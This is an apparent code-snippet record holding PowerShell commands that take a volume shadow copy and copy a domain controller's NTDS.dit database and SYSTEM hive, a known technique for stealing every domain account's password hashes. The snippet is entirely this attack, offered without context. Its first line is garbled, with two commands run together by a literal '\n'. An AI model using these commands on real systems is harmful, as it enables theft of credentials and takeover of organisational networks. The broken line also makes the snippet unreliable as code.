---
id: 9c9de7a1-9236-4cb4-87d6-287ba160177d
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:03.881476+00:00'
updated_at: '2023-04-10T20:26:12.431159+00:00'
---

# Code Snippet 9c9de7a1

**Language**: Powershell

```powershell
vssadmin create shadow /for=C:\ncopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy
```
